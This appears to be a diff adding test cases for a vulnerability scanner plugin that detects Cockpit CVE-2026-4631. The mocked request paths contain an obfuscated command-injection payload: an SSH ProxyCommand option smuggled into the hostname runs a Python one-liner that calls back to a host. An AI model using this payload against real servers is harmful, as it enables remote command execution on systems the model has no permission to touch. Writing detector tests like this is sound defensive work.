@@ -1,0 +1,76 @@
+# proto-file: proto/templated_plugin_tests.proto
+# proto-message: TemplatedPluginTests
+
+config: {
+  tested_plugin: "Cockpit_CVE_2026_4631"
+}
+
+tests: {
+  name: "whenVulnerableOob_returnsTrue"
+  expect_vulnerability: true
+  mock_callback_server: {
+    enabled: true
+    has_interaction: true
+  }
+  mock_http_server: {
+    mock_responses: [
+      {
+        uri: "/"
+        status: 200
+        body_content: "<script>var environment = {\"is_cockpit_client\":false};</script><script src=\"cockpit/static/login.js\"></script>"
+      },
+      {
+        uri: "/cockpit+=[-oProxyCommand=python3$IFS-c$IFS\'__import__(bytes([117,114,108,108,105,98,46,114,101,113,117,101,115,116]).decode()).request.urlopen(bytes([104,116,116,112,58,47,47]).decode()+__import__(bytes([115,121,115]).decode()).argv[1]+bytes([58]).decode()+__import__(bytes([115,121,115]).decode()).argv[2]+bytes([47]).decode()+__import__(bytes([104,97,115,104,108,105,98]).decode()).sha3_224(__import__(bytes([115,121,115]).decode()).argv[3].encode()).hexdigest())\'$IFS\'127.0.0.1\'$IFS\'8080\'$IFS\'testsecret\']:22/login"
+        status: 401
+        body_content: '{"command":"init","problem":"authentication-failed"}'
+      }
+    ]
+  }
+}
+
+tests: {
+  name: "whenNotVulnerableOob_returnsFalse"
+  expect_vulnerability: false
+  mock_callback_server: {
+    enabled: true
+    has_interaction: false
+  }
+  mock_http_server: {
+    mock_responses: [
+      {
+        uri: "/"
+        status: 200
+        body_content: "<script>var environment = {\"is_cockpit_client\":false};</script><script src=\"cockpit/static/login.js\"></script>"
+      },
+      {
+        uri: "/cockpit+=[-oProxyCommand=python3$IFS-c$IFS\'__import__(bytes([117,114,108,108,105,98,46,114,101,113,117,101,115,116]).decode()).request.urlopen(bytes([104,116,116,112,58,47,47]).decode()+__import__(bytes([115,121,115]).decode()).argv[1]+bytes([58]).decode()+__import__(bytes([115,121,115]).decode()).argv[2]+bytes([47]).decode()+__import__(bytes([104,97,115,104,108,105,98]).decode()).sha3_224(__import__(bytes([115,121,115]).decode()).argv[3].encode()).hexdigest())\'$IFS\'127.0.0.1\'$IFS\'8080\'$IFS\'testsecret\']:22/login"
+        status: 401
+        body_content: '{"command":"init","problem":"authentication-failed","message":"hostname contains invalid characters"}'
+      }
+    ]
+  }
+}
+
+tests: {
+  name: "whenNotCockpit_returnsFalse"
+  expect_vulnerability: false
+  mock_callback_server: {
+    enabled: true
+    has_interaction: false
+  }
+  mock_http_server: {
+    mock_responses: [
+      {
+        uri: "/"
+        status: 404
+        body_content: "Not Found"
+      }
+    ]
+  }
+}
+
+
+
+
+
+
